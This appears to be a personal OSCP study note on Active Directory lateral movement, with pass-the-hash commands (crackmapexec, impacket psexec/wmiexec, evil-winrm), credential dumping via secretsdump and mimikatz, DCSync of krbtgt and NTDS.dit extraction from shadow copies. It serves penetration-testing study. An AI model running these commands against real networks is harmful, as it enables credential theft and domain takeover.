---
status: working
tags:
  - active-directory
  - lateral-movement
  - dcsync
  - persistence
---
> *AD Lateral Movement and Domain Compromise:* Using a credential or hash to move between hosts, harvest more credentials, and reach the DC. Trigger: you have creds or a hash for an account that is local admin somewhere (BloodHound "AdminTo"/"CanRDP"), or you have local/domain admin on a host. This is the payoff of [[AD Attacks]].

## Lateral Movement

Pass-the-Hash authenticates with the hash directly, no plaintext needed, which is why dumping hashes unlocks movement.

```bash
crackmapexec smb $IP -u user -H <NTLM> -x 'whoami'        # test admin + run a command
impacket-psexec corp.com/user@$IP -hashes :<NTLM>          # SYSTEM shell (noisy, drops a service)
impacket-wmiexec corp.com/user@$IP -hashes :<NTLM>         # quieter, semi-interactive
impacket-psexec corp.com/user:'pass'@$IP                    # via ADMIN$ with a plaintext password
evil-winrm -i $IP -u user -H <NTLM>                         # WinRM shell with a hash
```
PowerShell remoting from a Windows foothold:
```powershell
$sp = ConvertTo-SecureString 'pass' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('CORP\user',$sp)
Enter-PSSession -ComputerName TARGET -Credential $cred
```

> [!note]
> psexec is reliable but loud, wmiexec is quieter, evil-winrm needs WinRM (5985). Use CME first to find which hosts the credential is admin on, then pick a shell method. Kerberos variants (overpass-the-hash, pass-the-ticket) are the fallback when NTLM auth is blocked but Kerberos is allowed, drive them with [[Rubeus]].

## Credential Access & Domain Compromise

Trigger: local or domain admin on a host, now harvest more creds and pivot toward the DC.

```bash
impacket-secretsdump corp.com/user@$IP -hashes :<NTLM>                         # SAM/LSA/cached on a host
impacket-secretsdump corp.com/DAuser:'pass'@<DC-IP> -just-dc-user Administrator # DCSync one account
impacket-secretsdump corp.com/DAuser:'pass'@<DC-IP> -just-dc                    # DCSync everything incl. krbtgt
```

> [!example] mimikatz equivalents (Windows host with admin)
> ```
> privilege::debug
> sekurlsa::logonpasswords          :: creds/hashes from LSASS memory
> lsadump::sam                       :: local SAM hashes
> lsadump::dcsync /domain:corp.local /user:Administrator
> lsadump::dcsync /domain:corp.local /user:krbtgt          :: krbtgt for Golden Ticket
> ```
> Key-import error? Use the older `mimikatz_trunk` build ([[Reference Sites]]).

> [!note]
> Run `secretsdump` even on non-DCs, a box a Domain Admin logged into may cache their creds. DCSync abuses the replication right (`GetChangesAll`) to ask the DC for a user's hash as if you were another DC, so no code runs on the DC. Administrator hash from the DC = domain owned, pass-the-hash into the DC and grab the flag.

## Shadow Copies: Reading NTDS.dit on the DC

Trigger: you are admin on the DC but want the whole AD database and direct LSASS access is guarded.

> [!note]
> A Volume Shadow Copy is a point-in-time disk snapshot, and because it is a copy you can read the normally-locked `NTDS.dit` (every domain hash) and the SYSTEM hive out of it, then extract offline with `impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL`. Built-in `vssadmin`/`ntdsutil`/`diskshadow` create the snapshot. The trigger and the why are the parts worth memorizing.

## Persistence (presently light only)

On OSCP, just note a working credential or hash so a dropped shell is not fatal. No advanced persistence is needed. Golden/Silver tickets ([[AD Attacks]]) are the persistence tools you reach for after full compromise.

> [!TODO]
Add to this as I build out my own persistence capabilities

## See Also

- [[AD Attacks]] for how you get the hash or the DCSync right in the first place
- [[Rubeus]] and [[BloodyAD]] for on-host and remote variants
- [[Post-Exploitation Loot Loop]] for the reuse cycle that drives all of this
- [[Finding Credentials]] for host-level looting once you land
- Source: [[OSCP Field Manual]] sections 7.2, 7.3
